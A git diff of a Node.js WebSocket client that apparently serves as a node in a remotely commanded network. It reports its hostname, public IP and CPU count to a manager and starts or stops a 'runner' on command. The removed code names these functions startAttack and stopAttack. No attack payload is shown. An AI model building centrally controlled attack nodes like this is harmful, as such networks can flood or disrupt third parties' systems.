@@ -1,34 +1,45 @@
 const WebSocket = require("ws")
 const os = require("os")
-const { Docker } = require("docker-cli-js")
+const axios = require("axios")
 
-const client = new WebSocket("ws://manager:7071/v1/runner")
+const Runner = require("./lib/runner")
+const settings = require("./lib/settings")
 
-client.addEventListener("open", (event) => {
+const client = new WebSocket(settings.manager.url)
+
+const runner = new Runner()
+
+const GET_IP_URL = "https://api.myip.com"
+
+client.addEventListener("open", async (event) => {
   console.log("Connected")
 
   const server = event.target
+  const network = await axios.get(GET_IP_URL)
+
   const payload = {
     command: "subscribe",
     options: {
-      hostname: os.hostname()
+      hostname: os.hostname(),
+      network: network.data,
+      cpus: os.cpus().length,
     }
   }
 
   server.send(JSON.stringify(payload))
 })
 
-client.addEventListener("message", (data) => {
+client.addEventListener("message", async (data) => {
   const message = JSON.parse(data.data)
   const { command, options } = message
 
   switch (command) {
     case "start":
-      startAttack(options)
+      await runner.start(options)
       break;
 
     case "stop":
-      stopAttack()
+      await runner.stop()
       break;
 
     default:
@@ -37,16 +48,8 @@ client.addEventListener("message", (data) => {
   }
 })
 
-const startAttack = async (options = {}) => {
-  console.log("startAttack", options)
-}
-
-const stopAttack = async () => {
-  console.log("stopAttack")
-}
-
 client.addEventListener("close", async () => {
-  await stopAttack()
+  await runner.stop()
 
   console.log("Closing")
 })
@@ -54,7 +57,7 @@ client.addEventListener("close", async () => {
 const gracefulShutdown = async () => {
   console.log("Shutting down...")
 
-  await stopAttack()
+  await runner.stop()
   process.exit()
 }
 
